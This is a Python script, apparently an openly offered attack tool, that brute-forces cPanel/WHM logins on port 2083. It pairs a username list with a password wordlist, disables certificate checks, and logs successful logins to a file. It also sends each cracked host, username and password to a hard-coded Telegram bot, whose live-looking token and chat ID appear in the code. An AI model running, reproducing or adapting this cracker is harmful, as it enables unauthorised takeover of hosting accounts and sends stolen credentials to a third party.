# Author: Pari Malam
import os
import requests
import concurrent.futures
import argparse
from colorama import Fore, init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

FR = Fore.RED
FY = Fore.YELLOW
FW = Fore.WHITE
FG = Fore.GREEN
FC = Fore.CYAN

# Buat folder Results jika belum ada
if not os.path.exists('Results'):
    os.mkdir('Results')

# Token dan chat_id Telegram
TELEGRAM_TOKEN = "7830226248:AAE_EwQIYsNIZbgyqI9rr6iSaSCPD2ON048"
TELEGRAM_CHAT_ID = "5682628749"

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{Fore.YELLOW}[cPanel & WHM] - {Fore.GREEN}Perform With Massive cPanel/WHM Account Cracker\n")

banners()

def URLdomain(url):
    return url.split('/')[0]

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message
    }
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print(f"{FG}[Success!] - Pesan terkirim ke Telegram")
        else:
            print(f"{FR}[Error!] - Gagal mengirim pesan ke Telegram")
    except Exception as e:
        print(f"{FR}[Error!] - Terjadi kesalahan saat mengirim pesan ke Telegram: {str(e)}")

def cw(url):
    p = [2083]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    try:
        session = requests.Session()

        for port in p:
            uwp = f'{url}:{port}'
            response = session.get(uwp, headers=headers, verify=False)
            if response.status_code == 200:
                print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[cPanel Found!] - {FW}{uwp}")
                with open("Results/cPanel.txt", "a") as f:
                    f.write(f"[+] cPanel: {uwp}\n")
            else:
                print(f"{FY}[cPanel/WHM] - {FR}[Not Found!] - {FW}{uwp}")

    except Exception as e:
        print(f"{FY}[cPanel/WHM] - {FR}[Error!] - {FW}{uwp} - {FC}{str(e)}")

def c(url, username, password):
    ports = [2083]
    ep = "/login/?login_only=1"

    for port in ports:
        uwp = f'{url}:{port}{ep}'

        payload = {
            "user": username,
            "pass": password,
            "goto_uri": "/"
        }

        headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Origin': f'{url}:{port}',
            'Referer': f'{url}:{port}/',
            'Connection': 'keep-alive'
        }

        try:
            response = requests.post(uwp, data=payload, headers=headers, verify=False)
            response.raise_for_status()

            # Cek jika login sukses
            if response.status_code == 200 and '"status":1' in response.text:
                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}{url}:{port} - {FC}{username}|{password}")
                
                # Format pesan untuk Telegram
                success_message = f"{url}:{port}cpanel|{username}|{password}"
                
                # Kirim ke file Cracked.txt
                with open("Results/Cracked.txt", "a") as f:
                    f.write(f"[+] URLs: {url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
                
                # Kirim pesan ke Telegram
                send_telegram_message(success_message)
            else:
                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}{url}:{port} - {FC}{username}|{password}")

        except requests.exceptions.RequestException as e:
            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}{url}:{port} - {FC}{username}|{password}")

def process_line(url, usernames, passwords):
    for username in usernames:
        domain = URLdomain(url)
        cw(domain)
        for password in passwords:
            c(domain, username, password)

def main():
    parser = argparse.ArgumentParser(description='Process some URLs and usernames.')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. example.com)')
    parser.add_argument('-p', '--password-file', required=True, help='Path to file containing passwords')
    parser.add_argument('-t', '--thread', type=int, default=5, help='Number of threads to use')
    args = parser.parse_args()

    url = args.url
    password_file = args.password_file
    num_threads = args.thread

    # Read usernames from usrlist.txt
    try:
        with open("usrlist.txt", "r", encoding='utf-8') as file:
            usernames = [line.strip() for line in file]

        # Read passwords from file provided by -p argument
        with open(password_file, "r", encoding='utf-8') as file:
            passwords = [line.strip() for line in file]

        # Use ThreadPoolExecutor to handle multiple threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(process_line, url, usernames, passwords)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"{FR}An error occurred: {e}")

    except FileNotFoundError as e:
        print(f"{FR}File not found: {e.filename}")

if __name__ == "__main__":
    main()
